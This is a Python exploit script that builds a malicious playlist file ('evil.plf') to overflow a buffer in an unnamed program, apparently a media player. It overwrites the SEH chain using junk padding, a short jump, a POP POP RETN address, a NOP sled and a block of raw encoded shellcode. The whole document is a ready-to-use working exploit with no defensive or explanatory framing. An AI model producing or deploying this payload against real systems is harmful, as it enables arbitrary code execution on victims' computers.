#!/usr/bin/python
  
filename="evil.plf"
#POP POP RETN address: 61617619 --> SEH
#nSEH-->jmp 001376C0--> EB 06
#buffer = junk+[nSEH]+[SEH]+Shellcode
#buffer = junk+[jump to shellcode ]+[POP POP RETN Instructions]+Shellcode
shell = "\xd9\xcf\xd9\x74\x24\xf4\xbf\x7f\x99\xa4\x4c\x5b\x33\xc9\xb1\x33\x31\x7b\x17\x83\xc3\x04\x03\x04\x8a\x46\xb9\x06\x44\x0f\x42\xf6\x95\x70\xca\x13\xa4\xa2\xa8\x50\x95\x72\xba\x34\x16\xf8\xee\xac\xad\x8c\x26\xc3\x06\x3a\x11\xea\x97\x8a\x9d\xa0\x54\x8c\x61\xba\x88\x6e\x5b\x75\xdd\x6f\x9c\x6b\x2e\x3d\x75\xe0\x9d\xd2\xf2\xb4\x1d\xd2\xd4\xb3\x1e\xac\x51\x03\xea\x06\x5b\x53\x43\x1c\x13\x4b\xef\x7a\x84\x6a\x3c\x99\xf8\x25\x49\x6a\x8a\xb4\x9b\xa2\x73\x87\xe3\x69\x4a\x28\xee\x70\x8a\x8e\x11\x07\xe0\xed\xac\x10\x33\x8c\x6a\x94\xa6\x36\xf8\x0e\x03\xc7\x2d\xc8\xc0\xcb\x9a\x9e\x8f\xcf\x1d\x72\xa4\xeb\x96\x75\x6b\x7a\xec\x51\xaf\x27\xb6\xf8\xf6\x8d\x19\x04\xe8\x69\xc5\xa0\x62\x9b\x12\xd2\x28\xf1\xe5\x56\x57\xbc\xe6\x68\x58\xee\x8e\x59\xd3\x61\xc8\x65\x36\xc6\x26\x2c\x1b\x6e\xaf\xe9\xc9\x33\xb2\x09\x24\x77\xcb\x89\xcd\x07\x28\x91\xa7\x02\x74\x15\x5b\x7e\xe5\xf0\x5b\x2d\x06\xd1\x3f\xb0\x94\xb9\x91\x57\x1d\x5b\xee"
nops = "\x90"*20
final = nops+shell
buffer = "A"*608 + "\xEB\x06\x90\x90" + "\x19\x76\x61\x61" + final #+ "B"*(1384-len(final))
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()